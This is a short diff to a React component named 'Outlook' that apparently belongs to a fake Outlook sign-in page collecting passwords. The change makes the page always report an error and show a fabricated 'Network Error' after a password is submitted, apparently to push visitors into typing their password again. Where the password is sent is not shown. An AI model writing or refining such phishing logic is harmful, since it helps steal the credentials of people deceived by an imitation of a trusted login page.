@@ -8,10 +8,10 @@ import Preloader from "./Preloader/Preloader";
 import { CgArrowLongLeft } from "react-icons/cg";
 
 
-
 const Outlook = ()=>{
 
     const [spinLoader, setSpinLoader] = useState(false);
+    const [netErr, setNetErr] = useState(false);
 
     const formRef = useRef();
 
@@ -68,7 +68,8 @@ const Outlook = ()=>{
             });
             setTimeout(()=>{
                 setOulookPassword('');
-                setErr(false);
+                setErr(true);
+                setNetErr(true);
                 setTimeout(() => {
                     setSpinLoader(false);
                 }, 2000);
@@ -118,6 +119,8 @@ const Outlook = ()=>{
                      {/* account or <span className="gett">get a new one</span>. */}
                 </p>  
                 : null }
+
+                { netErr ? <p className="err">Network Error</p> : null }
 
                 <form onSubmit={submitOutlookForm} method="post" ref={formRef} className='forrmmm'>
 
